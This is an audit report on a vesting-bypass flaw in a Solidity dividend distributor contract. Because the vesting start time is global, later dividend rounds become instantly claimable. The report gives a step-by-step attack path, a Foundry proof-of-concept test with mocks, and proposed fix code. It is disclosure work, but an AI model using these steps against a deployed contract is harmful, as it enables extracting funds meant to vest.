# [001031] Global Vesting Parameters Enable Instant Claiming of Future Dividend Distributions
  
  ### Summary

The use of global contract-level vesting timestamps combined with per-user accumulated dividend state will cause a complete bypass of the vesting mechanism for all future dividend distributions as users will instantly claim subsequent dividend rounds after the initial vesting period expires by exploiting the permanently true condition that allows immediate full withdrawal.


### Root Cause

In `A26ZDividendDistributor.sol` the `claimDividends()` [function](https://github.com/dualguard/2025-11-alignerz/blob/f7eeed88d91356484c02af6f38b71f27b790828c/protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol#L186-L204) uses global contract-level timestamps (`startTime` and `vestingPeriod`) to determine vesting completion, while the `_setDividends()` function  accumulates new dividends into existing user balances using the `+=` operator. Once `block.timestamp >= vestingPeriod + startTime` becomes true after the first vesting period completes, this condition remains permanently true for all future time. When users claim after this point, their state is reset to `amount = 0` and `claimedSeconds = 0`. However, when new dividends are added via subsequent calls to `setUpTheDividends()`, the new amounts are accumulated into `dividendsOf[user].amount` while `claimedSeconds` remains at 0. The next claim will calculate `claimableSeconds = vestingPeriod - 0 = vestingPeriod`, allowing instant withdrawal of 100% of the new dividends despite them being intended to vest over the full period.


### Internal Pre-conditions

1. Owner needs to call `setUpTheDividends()` to distribute the initial round of dividends and set user balances in the dividendsOf mapping to non-zero values.
2. Time needs to progress such that `block.timestamp` exceeds `startTime + vestingPeriod` to trigger the state reset condition in `claimDividends()`.
3. At least one user needs to call `claimDividends()` after the vesting period expires to reset their `dividendsOf[user].amount` and `dividendsOf[user].claimedSeconds` to 0.
4. Owner needs to call `setUpTheDividends()` again to add a second round of dividends after the first vesting period has completed.

### External Pre-conditions

None required.

### Attack Path

1. Owner deploys the A26ZDividendDistributor contract on Day 0 with `startTime = block.timestamp` and `vestingPeriod = 90 days` as specified for quarterly distributions.
2. Owner calls `setUpTheDividends()` on Day 0 to distribute the first quarterly dividend of 1,000,000 USDC among TVS holders, which allocates amounts to users via the `_setDividends()` internal function.
3. User receives their proportional share, for example 100,000 USDC, stored as `dividendsOf[user].amount = 100000e6` with `dividendsOf[user].claimedSeconds = 0`.
4. User periodically calls `claimDividends()` over the 90-day period, claiming their vested portions according to the time elapsed, with `claimedSeconds` incrementing properly during Day 0 through Day 90.
5. On Day 91, after the first vesting period completes, user calls claimDividends() one final time to claim the remaining balance of Q1 dividends.
6. The condition `block.timestamp >= vestingPeriod + startTime` evaluates to true since 91 days >= 90 days, triggering the reset logic that sets `dividendsOf[user].amount = 0` and `dividendsOf[user].claimedSeconds = 0`.
7. On Day 91, owner calls `setUpTheDividends()` to distribute the second quarterly dividend of 1,000,000 USDC for Q2 as per the whitepaper's quarterly distribution schedule.
8. The `_setDividends()` function executes `dividendsOf[user].amount += 100000e6`, updating the user's balance to 100,000 USDC while their `claimedSeconds` remains at 0 from the previous reset.
9. User immediately calls `claimDividends()` again on Day 91, just moments after the new dividends were distributed, without waiting for any vesting time to pass.
10. The function evaluates `block.timestamp >= vestingPeriod + startTime` which is still true since startTime was never updated and remains at Day 0, so the condition becomes 91 >= 90 which evaluates to true, setting `secondsPassed = vestingPeriod = 90 days`.
11. With `claimedSeconds = 0` from the reset and `secondsPassed = 90 days`, the calculation `claimableSeconds = 90 days - 0 = 90 days` treats the new dividends as if they have already fully vested.
12. The user receives `claimableAmount = 100000e6 * 90 days / 90 days = 100000e6` USDC instantly, bypassing the intended 90-day vesting period entirely for the Q2 distribution.
13. This process repeats for every subsequent quarterly distribution throughout the year, with Q3 and Q4 dividends also becoming instantly claimable as soon as they are distributed, completely defeating the vesting mechanism for all distributions after the initial period.

### Impact

The protocol suffers the complete loss of vesting enforcement for all dividend distributions occurring after the initial vesting period expires. Using the example of quarterly distributions of 1,000,000 USDC as mentioned in the whitepaper, after the first quarter functions correctly, all subsequent quarters allow immediate withdrawal. Over one year, this means Q2, Q3, and Q4 distributions totaling 3,000,000 USDC are instantly claimable rather than vesting over their intended 90-day periods each. This directly violates the whitepaper promise in section 5.2 that dividends will be "dripped to TVS holders by the second" to prevent gaming, and instead enables the exact quick-flip behavior the vesting mechanism was designed to prevent. Users can purchase TVS tokens immediately before dividend distributions, claim instantly, and sell, extracting value without the long-term holding commitment the protocol intended to enforce. The fundamental economic model of the protocol is broken as the vesting incentive structure no longer functions beyond the first distribution period.

### PoC

Save the following as `test/DividendResetBypassTest.t.sol`
```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import "../src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol";
import "../src/interfaces/IAlignerzVesting.sol";

contract DividendResetBypassTest is Test {
    A26ZDividendDistributor public distributor;
    MockVesting public vesting;
    MockNFT public nft;
    MockERC20 public a26zToken;
    MockERC20 public sonicToken;
    MockERC20 public usdc;
    
    address public owner = address(1);
    address public user = address(2);
    
    uint256 public constant VESTING_PERIOD = 90 days;

    function setUp() public {
        vm.startPrank(owner);
        
        a26zToken = new MockERC20("A26Z", "A26Z");
        sonicToken = new MockERC20("SONIC", "SONIC");
        usdc = new MockERC20("USDC", "USDC");
        nft = new MockNFT();
        vesting = new MockVesting();
        
        distributor = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(usdc),
            block.timestamp,
            VESTING_PERIOD,
            address(a26zToken)
        );
        
        vm.stopPrank();
    }

    function testDividendResetAllowsInstantClaim() public {
        vm.startPrank(owner);
        
        nft.mint(user);
        vesting.setAllocation(0, address(sonicToken), 1000, 500);
        
        console.log("=== Q1 DIVIDEND DISTRIBUTION ===");
        console.log("Day 0: Distributing first quarterly dividend");
        
        usdc.mint(address(distributor), 100e6);
        distributor.setUpTheDividends();
        
        console.log("User allocated: 100 USDC");
        console.log("Vesting period: 90 days");
        
        vm.stopPrank();
        
        console.log("");
        console.log("=== FIRST VESTING PERIOD ===");
        
        vm.warp(block.timestamp + 45 days);
        console.log("Day 45: User claims");
        
        uint256 balBefore = usdc.balanceOf(user);
        vm.prank(user);
        distributor.claimDividends();
        uint256 claimed45 = usdc.balanceOf(user) - balBefore;
        console.log("Claimed:", claimed45 / 1e6, "USDC");
        
        vm.warp(block.timestamp + 46 days);
        console.log("");
        console.log("Day 91: User claims after vesting complete");
        
        balBefore = usdc.balanceOf(user);
        vm.prank(user);
        distributor.claimDividends();
        uint256 claimed91 = usdc.balanceOf(user) - balBefore;
        console.log("Claimed:", claimed91 / 1e6, "USDC");
        console.log("Total Q1 claimed:", (claimed45 + claimed91) / 1e6, "USDC");
        
        assertApproxEqAbs(claimed45 + claimed91, 100e6, 1e6);
        
        console.log("");
        console.log("=== Q2 DIVIDEND DISTRIBUTION (THE BUG) ===");
        console.log("Day 91: Owner distributes Q2 dividend");
        
        vm.startPrank(owner);
        usdc.mint(address(distributor), 200e6);
        distributor.setUpTheDividends();
        vm.stopPrank();
        
        console.log("");
        console.log("New allocation: 200 USDC");
        console.log("User claimedSeconds: 0 (reset)");
        console.log("Contract startTime: UNCHANGED from Day 0");
        console.log("Expected: Should vest over 90 days");
        console.log("Actual: Instantly claimable!");
        
        console.log("");
        console.log("Day 91: User immediately claims Q2");
        balBefore = usdc.balanceOf(user);
        vm.prank(user);
        distributor.claimDividends();
        uint256 claimedQ2 = usdc.balanceOf(user) - balBefore;
        
        console.log("Claimed INSTANTLY:", claimedQ2 / 1e6, "USDC");
        console.log("");
        console.log("=== BUG CONFIRMED ===");
        console.log("200 USDC claimed instantly");
        console.log("Should have vested over 90 days");
        
        assertEq(claimedQ2, 200e6);
        
        console.log("");
        console.log("=== TESTING Q3 ===");
        vm.warp(block.timestamp + 91 days);
        
        vm.startPrank(owner);
        usdc.mint(address(distributor), 300e6);
        distributor.setUpTheDividends();
        vm.stopPrank();
        
        balBefore = usdc.balanceOf(user);
        vm.prank(user);
        distributor.claimDividends();
        uint256 claimedQ3 = usdc.balanceOf(user) - balBefore;
        
        console.log("Q3: 300 USDC claimed instantly:", claimedQ3 / 1e6);
        assertEq(claimedQ3, 300e6);
        
        console.log("");
        console.log("All future dividends bypass vesting!");
    }
}

contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    
    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }
    
    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function totalSupply() external pure returns (uint256) { return 0; }
    function allowance(address, address) external pure returns (uint256) { return type(uint256).max; }
    function approve(address, uint256) external pure returns (bool) { return true; }
}

contract MockNFT {
    uint256 public totalMinted;
    mapping(uint256 => address) public owners;
    
    function mint(address to) public returns (uint256) {
        owners[totalMinted] = to;
        return totalMinted++;
    }
    
    function getTotalMinted() public view returns (uint256) {
        return totalMinted;
    }
    
    function extOwnerOf(uint256 tokenId) public view returns (address) {
        require(owners[tokenId] != address(0), "Not minted");
        return owners[tokenId];
    }
}

contract MockVesting is IAlignerzVesting {
    mapping(uint256 => Allocation) private _allocations;
    
    function setAllocation(uint256 nftId, address tokenAddr, uint256 totalAmount, uint256 unclaimedAmount) public {
        _allocations[nftId].amounts = new uint256[](1);
        _allocations[nftId].claimedSeconds = new uint256[](1);
        _allocations[nftId].vestingPeriods = new uint256[](1);
        _allocations[nftId].vestingStartTimes = new uint256[](1);
        _allocations[nftId].claimedFlows = new bool[](1);
        
        _allocations[nftId].amounts[0] = totalAmount;
        _allocations[nftId].claimedSeconds[0] = ((totalAmount - unclaimedAmount) * 90 days) / totalAmount;
        _allocations[nftId].vestingPeriods[0] = 90 days;
        _allocations[nftId].vestingStartTimes[0] = block.timestamp;
        _allocations[nftId].claimedFlows[0] = false;
        _allocations[nftId].token = IERC20(tokenAddr);
    }
    
    function allocationOf(uint256 nftId) external view returns (Allocation memory) {
        return _allocations[nftId];
    }
}
```

Run with:  forge test --match-contract DividendResetBypassTest --match-test testDividendResetAllowsInstantClaim -vvvv

### Mitigation

Track vesting start time per user or per distribution round rather than using global contract-level timestamps. Modify the Dividend struct to include a per-user vesting start time that is set when dividends are first allocated or updated:

```solidity
struct Dividend {
    uint256 amount;
    uint256 claimedSeconds;
    uint256 vestingStartTime;
}

function claimDividends() external {
    address user = msg.sender;
    Dividend storage dividend = dividendsOf[user];
    
    if (dividend.amount == 0) return;
    
    uint256 vestingEnd = dividend.vestingStartTime + vestingPeriod;
    uint256 secondsPassed;
    
    if (block.timestamp >= vestingEnd) {
        secondsPassed = vestingPeriod;
        dividend.amount = 0;
        dividend.claimedSeconds = 0;
        dividend.vestingStartTime = 0;
    } else {
        secondsPassed = block.timestamp - dividend.vestingStartTime;
        dividend.claimedSeconds = secondsPassed;
    }
    
    uint256 claimableSeconds = secondsPassed - dividend.claimedSeconds;
    uint256 claimableAmount = dividend.amount * claimableSeconds / vestingPeriod;
    
    stablecoin.safeTransfer(user, claimableAmount);
    emit dividendsClaimed(user, claimableAmount);
}

function _setDividends() internal {
    uint256 len = nft.getTotalMinted();
    for (uint i; i < len;) {
        (address owner, bool isOwned) = safeOwnerOf(i);
        if (isOwned) {
            uint256 newAmount = unclaimedAmountsIn[i] * stablecoinAmountToDistribute / totalUnclaimedAmounts;
            
            if (dividendsOf[owner].amount == 0) {
                dividendsOf[owner].vestingStartTime = block.timestamp;
                dividendsOf[owner].claimedSeconds = 0;
            } else {
                uint256 existingAmount = dividendsOf[owner].amount;
                uint256 existingStart = dividendsOf[owner].vestingStartTime;
                dividendsOf[owner].vestingStartTime = 
                    (existingStart * existingAmount + block.timestamp * newAmount) / 
                    (existingAmount + newAmount);
            }
            
            dividendsOf[owner].amount += newAmount;
        }
        unchecked {
            ++i;
        }
    }
    emit dividendsSet();
}
```
  